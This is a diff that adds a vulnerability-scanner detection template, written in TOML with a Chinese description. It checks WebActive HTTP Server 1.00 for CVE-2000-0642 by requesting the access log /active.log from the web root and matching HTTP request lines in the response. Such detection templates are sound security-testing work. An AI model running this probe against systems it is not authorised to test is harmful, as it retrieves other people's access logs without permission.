@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "WebActive HTTP Server 1.00 默认配置将访问日志 active.log 存储在网站根目录下，远程攻击者可直接请求 /active.log 获取日志内容，导致信息泄露。"
+id = "POC-AVE-2000-0780"
+name = "WebActive HTTP Server active.log 日志信息泄露检测"
+severity = "medium"
+tags = ["ave-2000-0780"]
+vuln_id = [
+    "CVE-2000-0642",
+    "AVE-2000-0780",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/active.log"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "HTTP/1.",
+    "GET ",
+    "POST ",
+]
